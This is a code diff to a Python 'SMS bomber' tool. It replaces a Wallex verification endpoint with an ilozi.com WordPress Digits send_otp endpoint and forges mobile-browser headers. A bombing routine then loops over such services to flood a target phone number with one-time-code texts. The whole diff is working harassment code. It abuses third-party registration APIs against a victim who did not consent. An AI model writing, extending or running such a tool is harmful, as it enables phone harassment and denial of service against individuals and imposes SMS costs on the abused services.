@@ -43,34 +43,51 @@ def check_internet():
 # ------------------------------
 
 
-def wallex(phone):
-    url = "https://api.wallex.ir/api/v1/auth/verify/mobile"
-    payload = {"mobile": "0" + phone.split("+98")[1]}
+def ilozi(phone):
+    """
+    تابع ارسال کد تأیید برای سایت ilozi.com
+    شماره تلفن باید با +98 باشد.
+    """
+    import requests
+
+    url = "https://ilozi.com/wp-json/digits/v1/send_otp"
+    
+    payload = {
+        "digits_reg_mobile": phone.split("+98")[1],  # شماره بدون +98
+        "digits_reg_countrycode": "98",
+        "type": "register",
+    }
+
+    headers = {
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+        "Accept": "application/json, */*; q=0.1",
+        "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Origin": "https://ilozi.com",
+        "Referer": "https://ilozi.com/?login=true",
+        "X-Requested-With": "XMLHttpRequest",
+    }
+
     try:
-        response = post(url, json=payload, timeout=5)
+        response = requests.post(url, data=payload, headers=headers, timeout=10)
         if response.status_code == 200:
-            print(f'{g}(Wallex) {a}Code Sent')
-            return True
+            data = response.json()
+            if data.get('success') is True:
+                print(f"{g}(ilozi) {a}Code Sent")
+                return True
+            else:
+                print(f"{r}(ilozi) {a}Failed or No Response")
+                return False
         else:
-            print(f'{r}[-] (Wallex) Failed or No Response{a}')
-    except Exception as e:
-        print(f'{r}[!] Wallex Exception: {e}{a}')
+            print(f"{r}(ilozi) {a}Failed or No Response")
+            return False
+    except:
+        print(f"{r}(ilozi) {a}Failed or No Response")
         return False
-
-
-
-# Wrapper to safely run each service
-def send_service_safe(service, phone):
-    result = service(phone)
-    if result:
-        print(f"{g}[+] {service.__name__}: Code Sent!")
-    else:
-        print(f"{y}[-] {service.__name__}: Failed or No Response")
-
 # Simple SMS bomber
 def Vip(phone, Time):
     services = [
-    wallex ]
+    ilozi ]
     total_services = len(services)
     
     print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
